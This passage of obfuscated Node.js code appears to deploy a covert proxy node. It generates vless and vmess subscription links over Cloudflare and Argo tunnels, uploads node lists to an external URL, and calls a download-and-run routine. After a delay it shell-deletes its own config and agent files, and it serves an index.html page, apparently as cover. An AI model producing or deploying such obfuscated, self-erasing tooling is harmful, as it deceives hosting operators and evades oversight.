_0x54e60b={_0x4cc139:0xe6,_0x34de31:0x119,_0x1878f4:0x181,_0x490366:0x199,_0x1b2532:0xfa,_0x1b1a16:0x174,_0x28cdbd:0x141,_0x2ef104:0x139,_0x526a18:0x146,_0x396d93:0x11d,_0x44544a:0x12d,_0x6c933e:0x141,_0x310807:0x139,_0x1de36f:0x11d},_0x3b3fb2=await _0x5927e7(),_0x11e602=NAME?NAME+'-'+_0x3b3fb2:_0x3b3fb2;return new Promise(_0x37f12e=>{setTimeout(()=>{const _0x1c2cbd={_0x4f0a23:0xfd,_0x308e5f:0x139,_0x91eb44:0x16e},_0x421791=_0x436e,_0x153043={'v':'2','ps':''+_0x11e602,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'auto','net':'ws','type':_0x421791(_0x54e60b._0x4cc139),'host':_0x376396,'path':_0x421791(_0x54e60b._0x34de31),'tls':'tls','sni':_0x376396,'alpn':'','fp':'firefox'},_0x30288d='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x421791(_0x54e60b._0x1878f4)+_0x376396+_0x421791(_0x54e60b._0x490366)+_0x376396+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x11e602+_0x421791(_0x54e60b._0x1b2532)+Buffer[_0x421791(0xfd)](JSON[_0x421791(_0x54e60b._0x1b1a16)](_0x153043))[_0x421791(_0x54e60b._0x28cdbd)](_0x421791(_0x54e60b._0x2ef104))+_0x421791(0xe8)+UUID+'@'+CFIP+':'+CFPORT+_0x421791(_0x54e60b._0x526a18)+_0x376396+'&fp=firefox&type=ws&host='+_0x376396+_0x421791(0x1a0)+_0x11e602+_0x421791(0xef);console[_0x421791(_0x54e60b._0x396d93)](Buffer[_0x421791(0xfd)](_0x30288d)[_0x421791(0x141)](_0x421791(0x139))),fs[_0x421791(_0x54e60b._0x44544a)](subPath,Buffer[_0x421791(0xfd)](_0x30288d)[_0x421791(_0x54e60b._0x6c933e)](_0x421791(_0x54e60b._0x310807))),console[_0x421791(_0x54e60b._0x1de36f)](FILE_PATH+_0x421791(0x178)),uploadNodes(),app[_0x421791(0x105)]('/'+SUB_PATH,(_0x907395,_0x1ce886)=>{const _0x1389bf=_0x421791,_0x427505=Buffer[_0x1389bf(_0x1c2cbd._0x4f0a23)](_0x30288d)[_0x1389bf(0x141)](_0x1389bf(_0x1c2cbd._0x308e5f));_0x1ce886['set']('Content-Type',_0x1389bf(_0x1c2cbd._0x91eb44)),_0x1ce886['send'](_0x427505);}),_0x37f12e(_0x30288d);},0x7d0);});}}async function uploadNodes(){const _0x5751d2={_0x43e927:0xf6,_0x2b3561:0x13c,_0x5c5377:0x11c,_0x2ac299:0x12e,_0x35b67a:0x101,_0x1a7e5e:0x17d,_0x49dd1e:0x174,_0x42b787:0x17b,_0x22d491:0x1ab,_0x3a3fa7:0x11d},_0x5ef7e6=_0x4d6eb4;if(UPLOAD_URL&&PROJECT_URL){const _0x11634e=PROJECT_URL+'/'+SUB_PATH,_0x31b11b={'subscription':[_0x11634e]};try{const _0x29ae6a=await axios[_0x5ef7e6(_0x5751d2._0x43e927)](UPLOAD_URL+_0x5ef7e6(0xf9),_0x31b11b,{'headers':{'Content-Type':_0x5ef7e6(0x1ab)}});return _0x29ae6a&&_0x29ae6a[_0x5ef7e6(_0x5751d2._0x2b3561)]===0xc8?(console['log']('Subscription\x20uploaded\x20successfully'),_0x29ae6a):null;}catch(_0x196d07){if(_0x196d07['response']){if(_0x196d07[_0x5ef7e6(0x102)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5ef7e6(_0x5751d2._0x5c5377)](listPath))return;const _0x1840aa=fs[_0x5ef7e6(0x1a7)](listPath,_0x5ef7e6(_0x5751d2._0x2ac299)),_0x3aaf55=_0x1840aa[_0x5ef7e6(0x11f)]('\x0a')[_0x5ef7e6(_0x5751d2._0x35b67a)](_0x2d0917=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5ef7e6(0x12c)](_0x2d0917));if(_0x3aaf55[_0x5ef7e6(_0x5751d2._0x1a7e5e)]===0x0)return;const _0xa2f780=JSON[_0x5ef7e6(_0x5751d2._0x49dd1e)]({'nodes':_0x3aaf55});try{const _0xf4dc=await axios[_0x5ef7e6(_0x5751d2._0x43e927)](UPLOAD_URL+_0x5ef7e6(_0x5751d2._0x42b787),_0xa2f780,{'headers':{'Content-Type':_0x5ef7e6(_0x5751d2._0x22d491)}});return _0xf4dc&&_0xf4dc['status']===0xc8?(console[_0x5ef7e6(_0x5751d2._0x3a3fa7)]('Nodes\x20uploaded\x20successfully'),_0xf4dc):null;}catch(_0x2a0095){return null;}}else return;}}function _0x436e(_0x4538e0,_0x37b081){const _0x268631=_0x2686();return _0x436e=function(_0x436ed1,_0x58a46c){_0x436ed1=_0x436ed1-0xe3;let _0x1fa0f7=_0x268631[_0x436ed1];return _0x1fa0f7;},_0x436e(_0x4538e0,_0x37b081);}function cleanFiles(){const _0x18c108={_0x4fba00:0xe7,_0x2e7e18:0x164};setTimeout(()=>{const _0x5cbe30={_0x5df385:0x11d},_0x114e74=_0x436e,_0x4cd1f3=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4cd1f3['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4cd1f3['push'](phpPath);process[_0x114e74(0x1af)]===_0x114e74(0x10d)?exec(_0x114e74(0x124)+_0x4cd1f3['join']('\x20')+'\x20>\x20nul\x202>&1',_0x439298=>{const _0x56e86c=_0x114e74;console[_0x56e86c(0xe7)](),console['log'](_0x56e86c(0x164)),console[_0x56e86c(_0x5cbe30._0x5df385)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x114e74(0x154)+_0x4cd1f3['join']('\x20')+_0x114e74(0xe3),_0x317d0c=>{const _0x2a57a1=_0x114e74;console[_0x2a57a1(_0x18c108._0x4fba00)](),console[_0x2a57a1(0x11d)](_0x2a57a1(_0x18c108._0x2e7e18)),console[_0x2a57a1(0x11d)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1ffb63={_0x274dcc:0x19e,_0x2ce550:0xf6,_0x386194:0x1ab,_0x278b66:0x19d},_0x5cae25=_0x4d6eb4;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5cae25(0x11d)](_0x5cae25(_0x1ffb63._0x274dcc));return;}try{const _0x360e58=await axios[_0x5cae25(_0x1ffb63._0x2ce550)](_0x5cae25(0x197),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5cae25(_0x1ffb63._0x386194)}});return console[_0x5cae25(0x11d)](_0x5cae25(_0x1ffb63._0x278b66)),_0x360e58;}catch(_0x15118d){return console['error'](_0x5cae25(0x103)+_0x15118d[_0x5cae25(0x128)]),null;}}async function startserver(){const _0x59610a={_0xc709b0:0xf7},_0x4c937c=_0x4d6eb4;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x337f36){console['error'](_0x4c937c(_0x59610a._0xc709b0),_0x337f36);}}startserver()[_0x4d6eb4(0x183)](_0x307efe=>{const _0x2eeb5e={_0x399d15:0x122},_0x5e2b91=_0x4d6eb4;console['error'](_0x5e2b91(_0x2eeb5e._0x399d15),_0x307efe);}),app[_0x4d6eb4(0x105)]('/',async function(_0x38650e,_0x7bf08f){const _0x24d41c={_0x8a0cd9:0x13b,_0x22aac3:0x114,_0x1ef00b:0x189,_0x23abab:0x189,_0x5b341d:0x165},_0x72f05b=_0x4d6eb4;try{const _0x2e0dfd=path[_0x72f05b(_0x24d41c._0x8a0cd9)](__dirname,'index.html'),_0x46cf37=await fs[_0x72f05b(0x177)][_0x72f05b(0x14f)](_0x2e0dfd,_0x72f05b(_0x24d41c._0x22aac3));_0x7bf08f[_0x72f05b(_0x24d41c._0x1ef00b)](_0x46cf37);}catch(_0x3feca9){_0x7bf08f[_0x72f05b(_0x24d41c._0x23abab)](_0x72f05b(_0x24d41c._0x5b341d));}}),app[_0x4d6eb4(0x10c)](PORT,()=>console[_0x4d6eb4(0x11d)](_0x4d6eb4(0x1ad)+PORT+'!'));
